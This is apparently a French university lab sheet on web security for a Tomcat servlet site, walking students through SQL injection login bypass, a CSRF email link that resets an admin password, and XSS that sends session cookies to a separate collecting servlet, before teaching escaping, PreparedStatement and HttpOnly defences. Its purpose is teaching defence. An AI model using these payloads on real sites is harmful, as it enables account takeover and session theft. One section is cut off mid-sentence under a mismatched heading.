
# Sécurité des sites web

**Objectifs :**
- Comprendre les principes de base et savoir se protéger contre l'injection XSS et l'injection SQL

**Avertissement**  
TESTER LA VULNÉRABILITÉ D'UN SITE QUI N'EST PAS LE VÔTRE EST ILLEGAL  
NE RÉALISEZ CES EXERCICES QUE SUR VOS PROPRES SITES

## Préambule
Afin de pouvoir effectuer des tests de "piratage" interessants, il est nécessaire d'avoir une application qui nécessite une authentification
et une gestion de rôles, qui permet de saisir des données et d'afficher d'une manière ou d'une autre les données saisies. C'est le cas à l'issue de l'exercice précédant.

### Déploiement
1. Tomcat arrêté, récupérer et décompresser le fichier tp37.zip
1. Quelle commande Unix permet de savoir dans quelles pages sont réalisées les connexions ?
1. Quelle commande Unix permet de remplacer le nom de l'utilisateur par le votre ?
1. Modifiez l'ensemble des pages de manière à bien régler le driver, l'url, le login, le mot de passe nécessaires au bon fonctionnement
de ce site.
1. N'oubliez pas de créer la table et les données nécessaires (voir [data.sql](https://github.com/pmathieufr/dut_prog_web/blob/master/cours07/exercices/data.sql)) et compiler les servlets !

## Injection XSS
L'injection XSS (HTML ou Javascript) peut se faire partout où l'utilisateur saisit des données. Cela perturbera toute page qui
affichera le contenu de cette saisie, par exemple quand l'utilisateur modif
1. Saisir dans le champs login un login correct, mais sous la forme unbonlogin' or '1'='1, puis n'importe quoi dans le champs
mot de passe.  
Vous constatez que l'on se connecte sans le mot de passe en tant que l'utilisateur choisi.
1. Creez une table bidon(libelle text) avec quelques lignes dedans. Trouvez l'injection à effectuer au login pour effacer
complètement cette table par injection SQL
1. Vous êtes un nouvel utilisateur. Comment faire pour être directement inscrit à la création avec un compte admin inscrit
physiquement dans la base ?
1. Vous avez un compte sur ce site en tant que simple utilisateur. Comment modifier votre rôle pour passer de util à admin
dans la base.

## Social engineering
L'ingénierie sociale est une forme d'escroquerie utilisée en informatique pour obtenir d'autrui des informations clefs. Cette
pratique exploite les failles humaines et sociales, la crédulité des personnes possédant ce que l'on cherche à obtenir.

* L'administrateur est connecté
* Un pirate lui envoie un email en html en apparence anodin. Pour tester, envoyez vous un email contenant le texte :  
  ```html
  Peux tu jeter un oeil sur ma page perso
  <p>
  <a href=http://localhost:8080/tp37/servlet-Maj2?login=paul&mdp=toto&nom=&prenom=&adresse=>
  http://127.12.56.33/mapageperso.html</a>
  <p>
  Merci
  ```
* En tant qu'administateur paul, vous ne vous méfiez pas, et en recevant le mail, vous cliquez naïvement dessus.
* Ce faisant, paul vient de changer son mot de passe en toto, mot de passe que vous lui avez indiqué dans la partie cachée du lien.
* Le pirate peut maintenant se logger en paul/toto

## Le vol de sessions
Toutes les protections précédentes permettent d'éviter les attaques par injection les plus classiques, mais n'évitent pas pour autant
le vol de session.
Dans cet exercice nous allons voir comment se logguer sur un site en utilisant la session d'un autre utilisateur, sans saisir aucun
login ni mot de passe !
1. Nous utiliserons Chrome pour l'administrateur (ici paul/paul) et Firefox/Iceweasel pour le "voleur" (ici jean/jean)
qui est simple utilisateur. Lancez les deux et recadrez ces fenetres pour qu'elles soient côte à côte : Chromium à gauche,
Firefox à droite.
1. L'un des outils les plus pratiques pour "trafiquer" des pages HTML se nomme Firebug. Cet outil permet d'éditer, débugguer, tester CSS, HTML, et JavaScript en direct sur n'importe quelle page. Installez cet outil sur votre navigateur Firefox/Iceweasel : Outils - Modules Complémentaires - Firebug
1. Tout est maintenant prêt pour la démonstration
1. Un voleur (navigateur de droite), jean, non administrateur, injecte dans ses coordonnées (via "modifier vos infos") le code  
    ```javascript
    <script>alert(document.cookie)</script>
    ```
1. Paul (navigateur de gauche), administrateur, se connecte légalement avec son login/mdp sur le navigateur de gauche ... mais
il laisse sa session ouverte en allant boire un café :-(
1. Jean, le voleur en profite pour utiliser son navigateur et afficher la liste des coordonnées. L'affichage de cette page lui donne le JSESSIONID. Faites un copier du numéro.
1. Jean, le voleur retourne sur son navigateur Firefox qu'il lance sur la page de Menu
1. Avec Firebug (Affichage - Firebug), il va dans l'onglet cookie et modifie l'identfiant de session en mettant celui volé 1
1. Après un reload de cette page, il est maintenant connecté comme administrateur !
1. Les cookies sont accessibles coté client via les langages de Script comme Javascript. Certains navigateurs refusent cet accès pour les cookies avec la marque HttpOnly. Pour se protéger il faut donc toujours paramétrer son serveur avec des HttpOnly cookies.


## Industrialiser les vols de sessions
Certains pirates injectent dans les pages WEB des forums des liens permettant de voler vos cookies et les ranger dans leurs bases
de données
1. Ecrire dans vide (pas dans tp37 pour symboliser un autre serveur; celui du voleur) une servlet Voler.java qui récupere
un parametre p et le range dans une table numsessions(p text).
1. Injecter dans le site (page "Modifiez vos infos") le code suivant dans le champs adresse 2 :  
    ```html
    <a href="#" onclick="window.location=''http://mamachine:8080/vide/servlet-Voler?p=''+
    escape(document.cookie)">Cliquer ici!</a>
    ```
1. Demandez maintenant à vos voisins d'afficher cette page et de cliquer sur le lien
1. A chaque click d'un utilisateur, son numéro de session vient remplir votre table de sessions volées. Il ne vous reste plus qu'à laisser ce
piège toute la nuit, demain matin, votre BDD sera pleine de cookies tous frais ;-)

## Mise en sécurité "élémentaire" du site
1. Afin d'éviter l'injection XSS une technique basique et inefficace consiste à faire des replaceAll sur les chaines de caractères pour supprimer les caractères spéciaux<>'(). Testez cette approche sur le paramètre adresse.
1. Testez la saisie de Villeneuve d'Ascq dans l'adresse
1. l'API Commons-text de chez Apache et sa classe StringEscapeUtils est bien plus efficace puisqu'elle "encode" les caractères spéciaux ainsi que ceux supérieurs au code ascii 127.
  * Ecrire un programme Java simple qui saisit une chaine et affiche sa transformation avec la méthode escapeHtml4 de
la classe commons.text.StringEscapeUtils  
    ```java
    CharSequenceTranslator cst = StringEscapeUtils.ESCAPE_HTML4;  
    String translated=cst.translate(input);
    ```
  * Testez avec différentes chaines contenant des caractères spéciaux(genre `<h1>hello</h1>`)
  * Modifiez votre site en conséquence.
  * Testez la saisie de Villeneuve d'Ascq dans l'adresse
1. Afin d'évitez l'injection SQL, remplacez les Statement utilisés à partir de données saisies par des PreparedStatement
1. Restestez toutes les injections vues lors des précédents exercices

